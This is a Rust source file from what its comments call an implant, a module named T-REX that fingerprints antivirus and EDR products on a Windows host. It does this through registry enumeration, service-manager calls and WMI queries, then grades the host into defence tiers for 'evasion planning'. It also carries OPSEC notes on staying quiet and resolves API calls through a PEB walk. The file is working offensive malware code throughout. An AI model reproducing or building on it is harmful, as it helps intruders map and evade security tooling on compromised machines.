struct ServiceStatusProcess {
    pub service_type: u32,
    pub current_state: u32,
    pub controls_accepted: u32,
    pub win32_exit_code: u32,
    pub service_specific_exit_code: u32,
    pub check_point: u32,
    pub wait_hint: u32,
    pub process_id: u32,
    pub service_flags: u32,
}

unsafe fn create_toolhelp_snapshot() -> Handle {
    scanners::create_toolhelp_snapshot() as Handle
}
unsafe fn process32_first(h: Handle, pe: *mut ProcessEntry32W) -> i32 {
    scanners::process32_first(h, pe as *mut core::ffi::c_void)
}
unsafe fn process32_next(h: Handle, pe: *mut ProcessEntry32W) -> i32 {
    scanners::process32_next(h, pe as *mut core::ffi::c_void)
}
unsafe fn close_handle(h: Handle) {
    scanners::close_handle(h)
}

unsafe fn open_sc_manager() -> Handle {
    scanners::open_sc_manager() as Handle
}
unsafe fn close_sc_manager(h: Handle) {
    scanners::close_sc_manager(h)
}

unsafe fn enum_services_status_ex(
    scm: Handle,
    level: u32,
    typ: u32,
    state: u32,
    buf: *mut u8,
    buf_sz: u32,
    needed: *mut u32,
    returned: *mut u32,
    resume: *mut u32,
    _group: *const u16,
) -> i32 {
    scanners::enum_services_status_ex(
        scm, level, typ, state, buf, buf_sz, needed, returned, resume, _group,
    )
}

unsafe fn wcslen(s: *const u16) -> usize {
    scanners::wcslen(s)
}

unsafe fn wide_slice_to_utf8(w: &[u16]) -> String {
    scanners::wide_slice_to_utf8(w)
}
unsafe fn wide_to_utf8(w: *const u16) -> String {
    scanners::wide_to_utf8(w)
}
/// Convert an ASCII byte slice (from the Reg*A entrypoints) to an owned String.
/// Stops at the first NUL (registry names are NUL-terminated); bytes ≥ 0x80
/// become '?' (registry subkey names are ASCII by SCM rule, so this only fires
/// on a corrupted key — we never panic).
unsafe fn ascii_slice_to_string(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len());
    for &c in b {
        if c == 0 {
            break;
        }
        if c < 0x80 {
            s.push(c as char);
        } else {
            s.push('?');
        }
    }
    s
}

unsafe fn get_process_mitigation_policy(
    h: *mut core::ffi::c_void,
    policy: u32,
    buf: *mut core::ffi::c_void,
    len: u32,
) -> i32 {
    scanners::get_process_mitigation_policy(h, policy, buf, len)
}

fn alloc(sz: usize) -> *mut u8 {
    unsafe { scanners::alloc(sz) }
}
fn free(p: *mut u8) {
    unsafe { scanners::free(p) }
}

// ---- T1: Registry enumeration (real implementation) -----------------------
//
// Backs scan_service_registry. We use the advapi32 Reg*A (ANSI) entrypoints
// resolved in scanners.rs — service-name subkeys and the DisplayName/ImagePath
// values are all ASCII, so the -W widen would be pure overhead. See the
// scanners.rs T1 block for the OPSEC rationale (registry reads vs. SCM RPC).
//
// `HKey` is an opaque `usize` (a real HKEY from RegOpenKeyExA, never the
// predefined-handle sentinels — callers must open HKLM\...\Services first).
// `null_mut` is the failure sentinel throughout.

unsafe fn open_registry_key(path: &[u8]) -> HKey {
    // NUL-terminate the ASCII subkey path on the stack. MAX_PATH (260) covers
    // every Services-tree path we open.
    let mut buf = [0u8; 260];
    let n = path.len().min(buf.len() - 1);
    buf[..n].copy_from_slice(&path[..n]);
    let mut h: usize = 0;
    let st = scanners::reg_open_key_ex_a(
        scanners::HKEY_LOCAL_MACHINE,
        buf.as_ptr(),
        0,
        scanners::KEY_READ,
        &mut h,
    );
    if st != scanners::ERROR_SUCCESS || h == 0 {
        return core::ptr::null_mut();
    }
    h as HKey
}

unsafe fn open_registry_subkey(parent: HKey, name: &str) -> HKey {
    // Same NUL-terminate dance for the subkey name (service name, ASCII).
    let mut buf = [0u8; 260];
    let bytes = name.as_bytes();
    let n = bytes.len().min(buf.len() - 1);
    buf[..n].copy_from_slice(&bytes[..n]);
    let mut h: usize = 0;
    let st =
        scanners::reg_open_key_ex_a(parent as usize, buf.as_ptr(), 0, scanners::KEY_READ, &mut h);
    if st != scanners::ERROR_SUCCESS || h == 0 {
        return core::ptr::null_mut();
    }
    h as HKey
}

unsafe fn close_registry_key(k: HKey) {
    if k.is_null() {
        return;
    }
    scanners::reg_close_key(k as usize);
}

/// Enumerate one subkey name per call. `name` is an ASCII byte buffer the
/// caller owns; `len` is in/out (caller passes capacity, callee writes actual
/// length excluding NUL). Returns ERROR_SUCCESS (0) on success,
/// ERROR_NO_MORE_ITEMS (259) past the end, or another win32 error.
unsafe fn reg_enum_key(k: HKey, idx: u32, name: *mut u16, len: *mut u32) -> i32 {
    // Callers pass a u16 buffer for legacy reasons (the original -W design);
    // we cast to u8 since RegEnumKeyExA writes ASCII bytes into the same
    // memory. The capacity in bytes == the capacity in u16 units × 2, which is
    // strictly larger, so the write is in-bounds.
    if k.is_null() {
        return -1;
    }
    // RegEnumKeyExA counts in chars (bytes), not including the trailing NUL.
    // The caller's u16-capacity is bytes/2; keep it as-is so a 256-u16 buffer
    // reports 256 (the API will only ever write 255 chars + NUL anyway).
    scanners::reg_enum_key_ex_a(
        k as usize,
        idx,
        name as *mut u8,
        len,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        core::ptr::null_mut(),
    )
}

/// Read a `REG_SZ`/`REG_EXPAND_SZ` value as an owned ASCII String. Returns an
/// empty String if the value is missing or the type is not a string. We do NOT
/// expand %VAR% references (REG_EXPAND_SZ) — the matcher runs on substrings,
/// and the unexpanded form is still a reliable EDR fingerprint.
unsafe fn query_reg_value(k: HKey, name: &[u8]) -> String {
    if k.is_null() {
        return String::new();
    }
    let value_name = query_reg_value_name(name);
    // Two-pass: first query for the byte length, then allocate + read.
    let (typ, len) = match query_reg_value_size(k, &value_name) {
        Some(sz) => sz,
        None => return String::new(),
    };
    query_reg_value_read(k, &value_name, typ, len)
}

/// Copies the value name into a fixed 64-byte NUL-padded buffer.
fn query_reg_value_name(name: &[u8]) -> [u8; 64] {
    let mut value_name = [0u8; 64];
    let n = name.len().min(value_name.len() - 1);
    value_name[..n].copy_from_slice(&name[..n]);
    value_name
}

/// First RegQueryValueExA pass: returns (type, byte length) when the value is
/// a present REG_SZ/REG_EXPAND_SZ string, None otherwise.
unsafe fn query_reg_value_size(k: HKey, value_name: &[u8; 64]) -> Option<(u32, u32)> {
    let mut typ: u32 = 0;
    let mut len: u32 = 0;
    let st = scanners::reg_query_value_ex_a(
        k as usize,
        value_name.as_ptr(),
        core::ptr::null_mut(),
        &mut typ,
        core::ptr::null_mut(),
        &mut len,
    );
    if st != scanners::ERROR_SUCCESS || len == 0 {
        return None;
    }
    if typ != scanners::REG_SZ && typ != scanners::REG_EXPAND_SZ {
        return None;
    }
    Some((typ, len))
}

/// Second RegQueryValueExA pass: reads the value, trims trailing NULs and
/// decodes it lossy ASCII→String.
unsafe fn query_reg_value_read(k: HKey, value_name: &[u8; 64], typ: u32, len: u32) -> String {
    // Cap the allocation — a runaway length would be a registry corruption / API
    // misuse signal, not a real DisplayName. 8 KiB is well past MAX_PATH*2.
    let cap = (len as usize).min(8192);
    let mut buf = vec![0u8; cap + 1];
    let mut len2: u32 = (cap + 1) as u32;
    let mut typ = typ;
    let st = scanners::reg_query_value_ex_a(
        k as usize,
        value_name.as_ptr(),
        core::ptr::null_mut(),
        &mut typ,
        buf.as_mut_ptr(),
        &mut len2,
    );
    if st != scanners::ERROR_SUCCESS {
        return String::new();
    }
    // Trim trailing NUL(s) (REG_SZ is NUL-terminated; some writers emit extras).
    let mut end = (len2 as usize).min(cap);
    while end > 0 && buf[end - 1] == 0 {
        end -= 1;
    }
    // Lossy ASCII→String: service display/image paths are ASCII, but be
    // defensive — invalid UTF-8 becomes U+FFFD rather than panicking.
    match core::str::from_utf8(&buf[..end]) {
        Ok(s) => s.into(),
        Err(_) => {
            let mut out = String::with_capacity(end);
            let mut i = 0;
            while i < end {
                match core::str::from_utf8(&buf[i..end]) {
                    Ok(s) => {
                        out.push_str(s);
                        break;
                    }
                    Err(e) => {
                        let v = e.valid_up_to();
                        if v > 0 {
                            out.push_str(core::str::from_utf8(&buf[i..i + v]).unwrap());
                        }
                        out.push('\u{FFFD}');
                        i += v + 1;
                    }
                }
            }
            out
        }
    }
}

// ---- T2: WMI queries (real implementation) ---------------------------------
//
// Hand-rolled COM pipeline (implant is no_std PIC — windows-rs/wmi crates are
// out). scanners.rs owns the FFI primitives (CoInitializeEx, CoCreateInstance,
// IWbemLocator::ConnectServer, IWbemServices::ExecQuery, IEnumWbemClassObject::
// Next, IWbemClassObject::Get); this module wires them into three concrete
// queries against the EDR-relevant WMI namespaces.
//
// What the pipeline does:
//   1. CoInitializeEx(COINIT_MULTITHREADED)            — ole32 (force-loaded)
//   2. CoCreateInstance(CLSID_WbemLocator, IID_IWbemLocator)
//   3. locator->ConnectServer(ns, ...)                  → IWbemServices*
//   4. CoSetProxyBlanket(services, PKT_PRIVACY)         — KB5004442 DCOM hardening
//   5. services->ExecQuery(L"WQL", wql, RETURN|FORWARD) → IEnumWbemClassObject*
//   6. loop { enum->Next(WBEM_INFINITE, 1, &obj)
//             obj->Get(prop, 0, &variant)               → VT_BSTR
//             VariantClear(variant); Release(obj) }
//   7. Release(enum); Release(services); Release(locator)
//
// All BSTRs (namespace path, WQL text, property name) are wrapped via
// SysAllocString and freed via SysFreeString. The property value BSTR lives
// inside the VARIANT and is released by VariantClear.

/// Run a WQL query in a WMI namespace, collecting one string property from
/// each result object. Returns an empty Vec on any COM failure (we are a
/// scanner — a failure is a "no data" result, not fatal).
///
/// `namespace`/`wql`/`prop_name` are ASCII byte slices; they are widened to
/// UTF-16 (with a NUL terminator) on the stack, then wrapped as BSTRs.
///
/// Safety: COM is thread-affine — caller must invoke on the thread that
/// called CoInitializeEx. T-REX is single-threaded so this holds.
unsafe fn wmi_run_string_query(namespace: &[u8], wql: &[u8], prop_name: &[u8]) -> Vec<String> {
    let locator = match wmi_query_locator() {
        Some(l) => l,
        None => return Vec::new(),
    };
    let services = match wmi_query_connect(locator, namespace) {
        Some(s) => s,
        None => return Vec::new(),
    };
    // 4. CoSetProxyBlanket — required by 2022 DCOM hardening. Without it,
    //    ExecQuery fails with E_ACCESSDENIED on patched hosts. The locator
    //    itself does not need a blanket (ConnectServer already succeeded).
    //    RPC_C_AUTHN_LEVEL_PKT_PRIVACY (6) + RPC_C_IMP_LEVEL_IMPERSONATE (3).
    let _ = scanners::co_set_proxy_blanket(
        services,
        scanners::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        scanners::RPC_C_IMP_LEVEL_IMPERSONATE,
    );
    let enumerator = match wmi_query_exec(services, locator, wql) {
        Some(e) => e,
        None => return Vec::new(),
    };
    wmi_query_collect(enumerator, services, locator, prop_name)
}

/// CoInitializeEx + CoCreateInstance(CLSID_WbemLocator) → IWbemLocator*.
unsafe fn wmi_query_locator() -> Option<*mut c_void> {
    // 1. CoInitializeEx. Idempotent per-thread — return S_FALSE if already done.
    if !scanners::co_init_succeeded(scanners::co_initialize_ex()) {
        return None;
    }

    // 2. CoCreateInstance(CLSID_WbemLocator, IID_IWbemLocator) → IWbemLocator*.
    let clsid = scanners::Guid::from_bytes(scanners::CLSID_WBEM_LOCATOR);
    let iid = scanners::Guid::from_bytes(scanners::IID_IWBEM_LOCATOR);
    let locator = scanners::co_create_instance(&clsid, &iid);
    if locator.is_null() {
        return None;
    }
    Some(locator)
}

/// ConnectServer on the namespace → IWbemServices*. Releases the locator on failure.
unsafe fn wmi_query_connect(locator: *mut c_void, namespace: &[u8]) -> Option<*mut c_void> {
    // 3. ConnectServer. Build the BSTR for the namespace path. Only the
    //    namespace BSTR and the security-flags arg matter; the rest can be
    //    null/zero (anonymous local auth, default locale, no WbemContext).
    let ns_bstr = ascii_to_bstr(namespace);
    if ns_bstr.is_null() {
        scanners::com_release(locator);
        return None;
    }
    let mut services: *mut c_void = core::ptr::null_mut();
    let hr = scanners::wbem_locator_connect_server(
        locator,
        ns_bstr,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        0, // lSecurityFlags = 0 (no async connect)
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        &mut services,
    );
    scanners::sys_free_string(ns_bstr);
    if hr < 0 || services.is_null() {
        scanners::com_release(locator);
        return None;
    }
    Some(services)
}

/// ExecQuery → IEnumWbemClassObject*. Releases services/locator on failure.
unsafe fn wmi_query_exec(
    services: *mut c_void,
    locator: *mut c_void,
    wql: &[u8],
) -> Option<*mut c_void> {
    // 5. ExecQuery. Wrap "WQL" and the query text as BSTRs. RETURN_IMMEDIATELY
    //    | FORWARD_ONLY = semisynchronous forward-only enumeration (cheap,
    //    no cache to release, no blocking the provider host).
    let lang_bstr = ascii_to_bstr(b"WQL");
    let wql_bstr = ascii_to_bstr(wql);
    if lang_bstr.is_null() || wql_bstr.is_null() {
        scanners::sys_free_string(lang_bstr);
        scanners::sys_free_string(wql_bstr);
        scanners::com_release(services);
        scanners::com_release(locator);
        return None;
    }
    let mut enumerator: *mut c_void = core::ptr::null_mut();
    let hr = scanners::wbem_services_exec_query(
        services,
        lang_bstr,
        wql_bstr,
        scanners::WBEM_QUERY_FLAGS,
        core::ptr::null_mut(),
        &mut enumerator,
    );
    scanners::sys_free_string(lang_bstr);
    scanners::sys_free_string(wql_bstr);
    if hr < 0 || enumerator.is_null() {
        scanners::com_release(services);
        scanners::com_release(locator);
        return None;
    }

    // 6. Enumerator blanket — same reason as the services proxy.
    let _ = scanners::co_set_proxy_blanket(
        enumerator,
        scanners::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        scanners::RPC_C_IMP_LEVEL_IMPERSONATE,
    );
    Some(enumerator)
}

/// Collects results and tears down the COM objects (enumerator, services, locator).
unsafe fn wmi_query_collect(
    enumerator: *mut c_void,
    services: *mut c_void,
    locator: *mut c_void,
    prop_name: &[u8],
) -> Vec<String> {
    // 7. Iterate. Fetch one object at a time; stop when Next returns fewer
    //    than requested (WBEM_S_FALSE at end of result set) or an error.
    //    Cap at 64 results — a real host has at most a handful of AV products
    //    but Win32_Service can return thousands; we cap every query the same
    //    way (the matcher below short-circuits EDR-named services anyway).
    let prop_bstr = ascii_to_bstr(prop_name);
    if prop_bstr.is_null() {
        scanners::com_release(enumerator);
        scanners::com_release(services);
        scanners::com_release(locator);
        return Vec::new();
    }
    let out = wmi_query_iterate(enumerator, prop_bstr);
    scanners::sys_free_string(prop_bstr);

    // 8. Tear down. Each Release drops a refcount; WMI provider objects free
    //    themselves when their refcount hits zero.
    scanners::com_release(enumerator);
    scanners::com_release(services);
    scanners::com_release(locator);

    out
}

/// Iterates the result set, reading one string property per object.
unsafe fn wmi_query_iterate(enumerator: *mut c_void, prop_bstr: *mut u16) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut guard = 0u32;
    loop {
        if guard >= 64 {
            break;
        }
        guard += 1;

        let mut obj: *mut c_void = core::ptr::null_mut();
        let mut returned: u32 = 0;
        let hr = scanners::enum_wbem_next(
            enumerator,
            scanners::WBEM_INFINITE,
            1,
            &mut obj,
            &mut returned,
        );
        if returned == 0 || obj.is_null() {
            break; // WBEM_S_FALSE at end of set, or error — either way stop.
        }
        let _ = hr;

        // Get the property as a VARIANT. For AntiVirusProduct.displayName and
        // Win32_Service.Name the property is a VT_BSTR. If the provider
        // returns a different type we just skip this row.
        let mut variant = scanners::Variant::zero();
        let hr = scanners::wbem_object_get(
            obj,
            prop_bstr,
            0,
            &mut variant,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );
        if hr >= 0 {
            let bstr = variant.bstr_ptr();
            if !bstr.is_null() {
                let name = scanners::wide_to_utf8(bstr);
                out.push(name);
            }
        }
        scanners::variant_clear(&mut variant);
        scanners::com_release(obj);
    }
    out
}

/// Wrap an ASCII byte slice as a BSTR (UTF-16 + 4-byte length prefix, owned by
/// oleaut32). Returns a null BSTR on allocation failure. The caller MUST free
/// it with sys_free_string. The NUL terminator is added here.
unsafe fn ascii_to_bstr(ascii: &[u8]) -> *mut u16 {
    if ascii.len() > 1024 {
        // Sanity bound — no namespace/WQL/property we use is anywhere near this.
        return core::ptr::null_mut();
    }
    // Build a NUL-terminated UTF-16 buffer on the stack (ASCII fits the low
    // byte; this is the same convention scanners::wide_to_utf8 reverses).
    let mut wide = [0u16; 1026];
    let n = ascii.len().min(wide.len() - 1);
    for i in 0..n {
        wide[i] = ascii[i] as u16;
    }
    wide[n] = 0;
    scanners::sys_alloc_string(wide.as_ptr())
}

/// T2: Query `root\SecurityCenter2:AntiVirusProduct` for AV/EDR products.
///
/// Many EDR/AV vendors register here (it is what the Windows Security Center
/// UI reads). Consumer SKUs (Defender, McAfee, Norton, …) reliably populate
/// it; some enterprise EDRs (SentinelOne older builds) omit it but register a
/// service instead. We merge any hit into the assessment via match_process_name
/// so the existing vendor DB classifies it.
///
/// NOTE: `root\SecurityCenter2` does NOT exist on Server SKUs (Security Center
/// is client-only). ConnectServer will return WBEM_E_INVALID_NAMESPACE (0x8004100E)
/// and the query is a no-op — that is expected, not a bug.
unsafe fn wmi_query_av_products(a: &mut TargetAssessment) {
    // displayName is the human-readable product name (e.g. "Windows Defender",
    // "McAfee Endpoint Security"). productState/vendor are also available but
    // displayName alone is enough to classify.
    let names = wmi_run_string_query(
        b"root\\SecurityCenter2",
        b"SELECT displayName FROM AntiVirusProduct",
        b"displayName",
    );
    for name in names.iter() {
        if let Some(vendor) = match_process_name(name.as_str()) {
            let product = DetectedProduct {
                vendor,
                product_name: vendor.default_name(),
                detection_method: DetectionMethod::WMIAntivirusProduct,
                process_count: 0,
                driver_count: 0,
                service_count: 0,
            };
            merge_or_push(&mut a.products, product);
        }
    }
}

/// T2: Query `root\CIMV2:Win32_Service` for service names. Cross-references
/// the T1 (registry) and T3 (SCManager) scans — same vendor DB, but WMI sees
/// services that registry scanning misses (delayed-start, driver-backed).
/// Noisy (provider host logged), hence tier-2.
unsafe fn wmi_query_services(a: &mut TargetAssessment) {
    // Running + Auto-start services only. State/StartMode filtering keeps the
    // result set (and the WmiPrvSE log noise) bounded; stopped/disabled EDR
    // services are not interesting for evasion planning.
    let names = wmi_run_string_query(
        b"root\\CIMV2",
        b"SELECT Name FROM Win32_Service WHERE State='Running'",
        b"Name",
    );
    for name in names.iter() {
        if let Some(vendor) = match_service_name(name.as_str()) {
            let product = DetectedProduct {
                vendor,
                product_name: vendor.default_name(),
                detection_method: DetectionMethod::ServiceName,
                process_count: 0,
                driver_count: 0,
                service_count: 1,
            };
            merge_or_push(&mut a.products, product);
        }
    }
}

/// T2: Query `root\CIMV2:Win32_SystemDriver` for running kernel drivers. The
/// driver names often differ from service names (e.g. CrowdStrike's `csagent`
/// service ↔ `csagent` driver; SentinelOne's `SentinelMonitor` driver). This
/// tier catches EDR minifilters / notification drivers the user-mode scanners
/// cannot see. Lower value than AV products but cheap to run.
unsafe fn wmi_query_drivers(a: &mut TargetAssessment) {
    let names = wmi_run_string_query(
        b"root\\CIMV2",
        b"SELECT Name FROM Win32_SystemDriver WHERE State='Running'",
        b"Name",
    );
    // Driver names follow the kernel-driver naming space (vendor prefixes +
    // .sys suffix, e.g. csagent.sys / SysmonDrv / Wdfilter), which differs from
    // service names. match_driver_name encodes the driver-specific pattern set
    // — reusing match_service_name here both missed real drivers (no "wdfilter"
    // token in the service DB) and false-matched benign ones (the service
    // substring "sep" hits any *.sep inf).
    for name in names.iter() {
        if let Some(vendor) = match_driver_name(name.as_str()) {
            let product = DetectedProduct {
                vendor,
                product_name: vendor.default_name(),
                detection_method: DetectionMethod::DriverName,
                process_count: 0,
                driver_count: 1,
                service_count: 0,
            };
            merge_or_push(&mut a.products, product);
        }
    }
}

fn merge_or_push(products: &mut Vec<DetectedProduct>, product: DetectedProduct) {
    for p in products.iter_mut() {
        if p.vendor == product.vendor {
            p.process_count += product.process_count;
            p.driver_count += product.driver_count;
            p.service_count += product.service_count;
            return;
        }
    }
    products.push(product);
}

// ---- Selftest support -----------------------------------------------------

/// Self-test: run T0-T3 assessment and report the tier.
/// Exit codes:
///   0xE0 + tier (0..4) = Clean/ConsumerAV/EnterpriseEDR/KernelArmed/Fortress
///   0xFF = assessment failed (Unknown)
#[cfg(feature = "selftest")]
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_trex() -> ! {
    let assessment = assess_user_mode();

    // Write diagnostic report to C:\nyx\trex_report.txt
    write_report(&assessment);

    let code = 0xE0u32 + (assessment.tier as u32);
    exit_process(code);
}

unsafe fn write_report(a: &TargetAssessment) {
    // Resolve CreateFileW + WriteFile + CloseHandle via PEB walk
    let (cf, wf, ch) = match write_report_resolve() {
        Some(addrs) => addrs,
        None => return,
    };

    type FnCH = unsafe extern "system" fn(*mut c_void) -> i32;
    let _close: FnCH = core::mem::transmute(ch);

    let h = write_report_open(cf);
    if h as isize == -1 || h.is_null() {
        return;
    }
    write_report_body(wf, h, a);
}

/// Resolve CreateFileW + WriteFile + CloseHandle via PEB walk.
#[allow(dead_code)]
unsafe fn write_report_resolve() -> Option<(usize, usize, usize)> {
    let cf = crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW")
        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"CreateFileW"));
    let wf = crate::resolve::export_addr(b"kernel32.dll", b"WriteFile")
        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"WriteFile"));
    let ch = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle")
        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"CloseHandle"));

    match (cf, wf, ch) {
        (Some(cf), Some(wf), Some(ch)) => Some((cf, wf, ch)),
        _ => None,
    }
}

/// Transmutes CreateFileW and opens `C:\nyx\trex_report.txt` (CREATE_ALWAYS).
#[allow(dead_code)]
unsafe fn write_report_open(cf: usize) -> *mut c_void {
    type FnCF = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void;
    let create: FnCF = core::mem::transmute(cf);

    let path: [u16; 48] = {
        let s = b"C:\\nyx\\trex_report.txt";
        let mut a = [0u16; 48];
        for i in 0..s.len() {
            a[i] = s[i] as u16;
        }
        a
    };

    create(
        path.as_ptr(),
        0x4000_0000,
        0,
        core::ptr::null_mut(),
        2,
        0x80,
        core::ptr::null_mut(),
    )
}

/// Transmutes WriteFile and writes the header, tier, product list and recommendation.
#[allow(dead_code)]
unsafe fn write_report_body(wf: usize, h: *mut c_void, a: &TargetAssessment) {
    type FnWF =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    let write: FnWF = core::mem::transmute(wf);

    let mut written: u32 = 0;
    let _ = write(
        h,
        b"=== T-REX v2 Assessment ===\r\n".as_ptr(),
        28,
        &mut written,
        core::ptr::null_mut(),
    );
    // Tier
    let tier_str = match a.tier {
        ThreatTier::Clean => "Tier: Clean (0) - No EDR/AV detected\r\n",
        ThreatTier::ConsumerAV => "Tier: ConsumerAV (1) - Basic AV only\r\n",
        ThreatTier::EnterpriseEDR => "Tier: EnterpriseEDR (2) - Enterprise EDR present\r\n",
        ThreatTier::KernelArmed => "Tier: KernelArmed (3) - Kernel callbacks active\r\n",
        ThreatTier::Fortress => "Tier: Fortress (4) - HVCI+CET+CFG strict\r\n",
        _ => "Tier: Unknown\r\n",
    };
    let _ = write(
        h,
        tier_str.as_ptr(),
        tier_str.len() as u32,
        &mut written,
        core::ptr::null_mut(),
    );
    write_report_products(wf, h, a);
    write_report_recommendation(wf, h, a);
}

/// Writes the detected-product count and one line per product.
#[allow(dead_code)]
unsafe fn write_report_products(wf: usize, h: *mut c_void, a: &TargetAssessment) {
    type FnWF =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    let write: FnWF = core::mem::transmute(wf);

    let mut written: u32 = 0;
    let prod_count = a.products.len();
    let _ = write(
        h,
        b"Products detected: ".as_ptr(),
        19,
        &mut written,
        core::ptr::null_mut(),
    );
    let count_byte = [b'0' + (prod_count as u8).min(9), b'\r', b'\n'];
    let _ = write(
        h,
        count_byte.as_ptr(),
        3,
        &mut written,
        core::ptr::null_mut(),
    );
    for p in a.products.iter() {
        let name = p.vendor.default_name();
        let _ = write(h, b"  - ".as_ptr(), 4, &mut written, core::ptr::null_mut());
        let _ = write(
            h,
            name.as_ptr(),
            name.len() as u32,
            &mut written,
            core::ptr::null_mut(),
        );
        let _ = write(h, b"\r\n".as_ptr(), 2, &mut written, core::ptr::null_mut());
    }
}

/// Writes the closing recommendation line.
#[allow(dead_code)]
unsafe fn write_report_recommendation(wf: usize, h: *mut c_void, a: &TargetAssessment) {
    type FnWF =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    let write: FnWF = core::mem::transmute(wf);

    let mut written: u32 = 0;
    let _ = write(
        h,
        b"\r\nRecommendation: ".as_ptr(),
        17,
        &mut written,
        core::ptr::null_mut(),
    );
    let _ = write(
        h,
        a.recommendation.as_ptr(),
        a.recommendation.len() as u32,
        &mut written,
        core::ptr::null_mut(),
    );
    let _ = write(h, b"\r\n".as_ptr(), 2, &mut written, core::ptr::null_mut());
}

#[allow(dead_code)]
fn format_tier_num(t: u32) -> [u8; 8] {
    let mut buf = [b' ' as u8; 8];
    buf[0] = b'(';
    let mut n = t;
    let mut i = 7usize;
    loop {
        buf[i] = b'0' + (n % 10) as u8;
        n /= 10;
        if n == 0 {
            break;
        }
        i -= 1;
    }
    buf[7] = b')';
    buf
}

unsafe fn exit_process(code: u32) -> ! {
    let addr = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess")
        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"ExitProcess"));
    if let Some(a) = addr {
        type FnExit = unsafe extern "system" fn(u32) -> !;
        let f: FnExit = core::mem::transmute(a);
        f(code);
    }
    loop {
        core::hint::spin_loop();
    }
}
